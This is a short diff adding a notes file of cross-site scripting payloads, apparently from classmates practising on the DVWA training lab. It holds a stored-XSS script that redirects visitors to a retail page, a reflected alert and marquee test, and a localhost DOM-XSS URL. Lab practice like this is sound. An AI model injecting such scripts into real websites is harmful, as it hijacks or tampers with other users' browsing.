@@ -1,0 +1,13 @@
+---Script Jhon (Stored)
+<script>window.location.replace('https://www.paris.cl/black-friday/');</script>
+
+
+--- Script Diego (Reflected)
+
+<script>alert(1234)</script>
+<marquee>cellXD</marquee>
+
+
+---Script Andrea (DOM)
+
+http://localhost/DVWA/vulnerabilities/xss_d/?default=Hola
